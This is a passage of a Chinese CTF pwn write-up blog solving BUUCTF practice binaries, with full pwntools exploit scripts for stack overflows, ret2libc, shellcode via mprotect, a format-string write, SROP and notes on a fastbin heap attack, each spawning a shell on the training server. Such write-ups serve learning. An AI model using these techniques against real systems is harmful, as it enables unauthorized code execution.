class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br></pre></td></tr></table></figure><p>完整EXP</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29651</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class="line">read_addr=elf.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">mprotect=<span class="number">0x806ED40</span></span><br><span class="line">addr=<span class="number">0x80eb000</span></span><br><span class="line">p3_ret=<span class="number">0x806fcc8</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="keyword">asm</span>(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload  =<span class="string">&#x27;a&#x27;</span>*<span class="number">0x2d</span>+p32(mprotect)+p32(p3_ret)</span><br><span class="line">payload +=p32(addr)+p32(<span class="number">0x100</span>)+p32(<span class="number">0x7</span>)</span><br><span class="line"></span><br><span class="line">payload +=p32(read_addr)+p32(p3_ret)</span><br><span class="line"></span><br><span class="line">payload +=p32(<span class="number">0</span>)+p32(addr)+p32(len(shellcode))+p32(addr)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>exp看的不是很懂，但是大概理解意思</p><h2 id="iscn-2019-ne-5"><a href="#iscn-2019-ne-5" class="headerlink" title="iscn_2019_ne_5"></a>iscn_2019_ne_5</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>在做这道题的时候，发现自己32位传参还是有一定的不理解</p><p>32位传参：</p><p>一般是依靠类似于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">垃圾数据+ret_addr+某返回地址(bbbb)+arg1+arg2+.....</span><br></pre></td></tr></table></figure><p>这样子的，因为ret_addr的后面要紧跟某一个要返回的地址，这个东西编译器会处理好的，但是如果想要一次调用两个以上的函数，应该要先弹栈</p><p>例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system_addr+pop|ret+/bin/sh_addr+下一个函数</span><br></pre></td></tr></table></figure><p>如此如此</p><p>还有一个问题便是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)src = <span class="number">48</span>;</span><br></pre></td></tr></table></figure><p>ida里的一个语句，我点进去src的时候发现src在栈上，但是src是一个地址，所以我很好奇src到底是在栈上还是在栈上的一个地址，其实src就是在栈上，但是其指向的不一定在栈上</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_DWORD *)dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>src可控显然栈溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bamboo@bamboo-virtual-machine:/mnt/hgfs/shared/ctf-learn$ ROPgadget --binary ciscn_2019_ne_5 --<span class="built_in">string</span> <span class="string">&#x27;sh&#x27;</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line"><span class="number">0x080482ea</span> : sh</span><br></pre></td></tr></table></figure><p>找到sh，幸运的是sh是flussh的sh其后面\x00截断，不然打不了</p><h2 id="2018-rop"><a href="#2018-rop" class="headerlink" title="2018_rop"></a>2018_rop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">136</span>]; <span class="comment">// [esp+10h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出6个地址的长度，1个ebp所以只有一次只有5个，返回地址改main，4个地址长度</p><p>那么这里啥都没有，所以先泄露libc版本，然后system(‘’&#x2F;bin&#x2F;sh’)即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28188</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(elf.plt[<span class="string">&#x27;write&#x27;</span>])+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(<span class="number">1</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])+p32(<span class="number">4</span>)</span><br><span class="line">sh.send(pal)</span><br><span class="line">write_addr=u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr===&gt;&quot;</span>,hex(write_addr))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">pal=(<span class="number">0x88</span>+<span class="number">4</span>)*b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>+p32(system_addr)+p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])+p32(binsh_addr)</span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>与上题一样</p><h2 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/mnt/hgfs/shared/ctf-learn/2020_babystack2&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">1</span>, <span class="number">0LL</span>);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;**********************************&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*     Welcome to the BJDCTF!     *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* And Welcome to the bin world!  *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*  Let&#x27;s try to pwn the world!   *&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;* Please told me u answer loudly!*&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Are u ready?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]Please input the length of your name:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;nbytes);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)nbytes &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Oops,u name is too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]What&#x27;s u name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的整数溢出，一个输入0可以几乎无限溢出</p><p>然后一个backdoor</p><p>就搞定了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line"><span class="meta">#r=process(<span class="string">&#x27;./bjdctf_2020_babystack2&#x27;</span>)</span></span><br><span class="line">backdoor_addr=<span class="number">0x400726</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;[+]Please input the length of your name:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x10</span>+b<span class="number">&#x27;b</span><span class="number">&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">payload+=p64(backdoor_addr)</span><br><span class="line">r.recvuntil(b<span class="number">&#x27;</span>[+]What\<span class="string">&#x27;s u name?&#x27;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [esp+2Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+7Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  be_nice_to_people();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d!\n&quot;</span>, x);</span><br><span class="line">  <span class="keyword">if</span> ( x == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;running sh...&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是一个任意地址读x&#x3D;4就行啦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26902</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">over_flow=<span class="number">0x0804A02C</span></span><br><span class="line">pal=p32(over_flow)+b<span class="number">&#x27;</span>%<span class="number">11</span>$n<span class="number">&#x27;</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>本题就是一个溢出然后一个后门</p><p>因为retn之前没有leave所以没有ebp</p><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br></pre></td></tr></table></figure><p>后门</p><h2 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><p>常规rop</p><h2 id="ciscn-s-3"><a href="#ciscn-s-3" class="headerlink" title="ciscn_s_3"></a>ciscn_s_3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line"> RELRO:    Partial RELRO</span><br><span class="line"> Stack:    No canary found</span><br><span class="line"> NX:       NX enabled</span><br><span class="line"> PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = sys_read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是系统调用read和write，搞得不能泄露libc基址，很显然栈溢出</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211046.png" alt="image-20240306231221635" style="zoom: 50%;" /><p>没有leave，因此0x10后面就是ret</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211047.png" alt="image-20240306231332851"></p><p>两个gadget，一个rax&#x3D;15是sigreturn ，一个是rax&#x3D;59是execve</p><p>而vuln是系统调用就有syscall</p><p>那么很显然是SROP，万事俱备只差&#x2F;bin&#x2F;sh\x00的addr</p><p>那只能自己写</p><p>那就只能调用read_write看看能不能写到跟&#x2F;bin&#x2F;sh\x00偏移固定的地址啦</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211048.png" alt="image-20240307010520356" style="zoom:50%;" /><p>这个东西一看就知道是地址，就gdb进去看，然后出来看，减一下</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211049.png" alt="image-20240307010810093" style="zoom:50%;" /><p>突然发觉可以用search，记下来</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211050.png" alt="image-20240307010855890" style="zoom:50%;" /><p>偏移是128：这是一个大坑，因为glibc版本不同，他的偏移也是不同的！！！！其实是0x118偏移，但是不改libc版本就是0x128偏移</p><p>因为buf是在rsp+10，而write能写0x30个字节，那么就会有rbp在里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#sh=process(&#x27;./ciscn_s_3&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27109</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">rax_15_ret=<span class="number">0x04004DA</span></span><br><span class="line">syscall_ret=<span class="number">0x0400517</span></span><br><span class="line">read_write_ret=<span class="number">0x004004F1</span></span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="number">8</span>*<span class="string">b&#x27;a&#x27;</span>+p64(read_write_ret)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.sendline(pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sh.recv(<span class="number">0x20</span>)</span><br><span class="line">binsh_addr=u64(sh.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;binsh_addr===&gt;&quot;</span>,<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=constants.SYS_execve</span><br><span class="line">frame.rdi=binsh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret</span><br><span class="line">frame_bytes = <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(rax_15_ret)+p64(syscall_ret)+frame_bytes</span><br><span class="line">sh.sendline(pal)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h2><p>首先是它一开始就给你了一个gift：栈地址</p><p>然后估摸是crashme\x00绕过避免改payload,然后就是溢出</p><p>因为这里\n会截断，所以两个想法</p><p>一个是shellcode写栈上</p><p>一个是rop链</p><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>因为内存页的缘故，所以一般刚初始化的堆块起始地址末尾为00</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​首先是分配多个堆块，包括一个size为0x20堆块，以及0x90堆块，然后free chunk1，再改chunk1的fd位指向chunk2，我们是要将chunk2再次malloc，但是fastbin堆块分配的时候会有check size的检查，那么就再覆盖0x90堆块的size为0x20，之后malloc了之后改回来，然后再释放该堆块到unsortedbin，就可以Print泄露libc基址</p><p>​之后便是分配堆块到malloc_hook上方，可以通过字节错位找到相应的堆块</p><p>fastbin中有fd的先被分配</p><p>以下是一些过程</p><p>首先要分配fastbin，就要找到合法的堆块，可以用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find_fake_fast addr</span><br></pre></td></tr></table></figure><p>找到堆块</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211051.png" alt="image-20240308142904319"></p><p>填充完就这样</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282211052.png" alt="image-20240308145448733"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 